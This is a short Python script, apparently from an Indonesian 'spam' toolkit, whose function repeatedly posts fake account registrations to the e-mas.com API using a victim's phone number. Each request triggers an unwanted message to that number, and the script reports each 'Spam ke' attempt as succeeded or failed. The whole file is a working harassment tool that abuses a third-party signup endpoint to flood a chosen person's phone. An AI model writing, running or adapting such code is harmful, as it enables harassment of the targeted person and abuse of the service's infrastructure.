import requests,os,sys,json
from time import sleep
from war.war import *

def emas(nom, jml):
	sleep(2)
	print("")
	r = requests.Session()
	dat = json.dumps({
	  "handphone": nom,
	  "email": "asecxgans@gmail.com",
	  "password": "222222",
	  "using_ref_code": "",
	  "fullname": "Asecx",
	  "gender": "M",
	  "security_question": "Apa makanan favorit Anda?",
	  "security_answer": "Ayam",
	  "token": "asd",
	  "device_id": "Chrome Mobile",
	  "device_type": "Android",
	  "device_name": "Generic Smartphone"
	})

	head = {
	"Host": "www.e-mas.com",
	"Connection": "keep-alive",
	"Content-Length": "305",
	"Accept": "application/json, text/plain, */*",
	"yst": "6ffab813ab502c9b5a90971bff6b740ca9270ae4",
	"method": "post",
	"section": "customer",
	"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Content-Type": "application/json;charset=UTF-8",
	"Origin": "https://www.e-mas.com",
	"Referer": "https://www.e-mas.com/daftar",
	}

	for x in range(jml):
	  cal = r.post("https://www.e-mas.com/api",data=dat,headers=head)
	  if 'error_code' in cal.text:
	       print(f"{k}[+] {c}Spam ke {k}{nom} {c}Berhasil ")
	       sleep(60)
	  else:
	       print(f"{r}[+] {c}Spam ke {k}{nom} {c}Gagal!! ")
	       sleep(1.5)
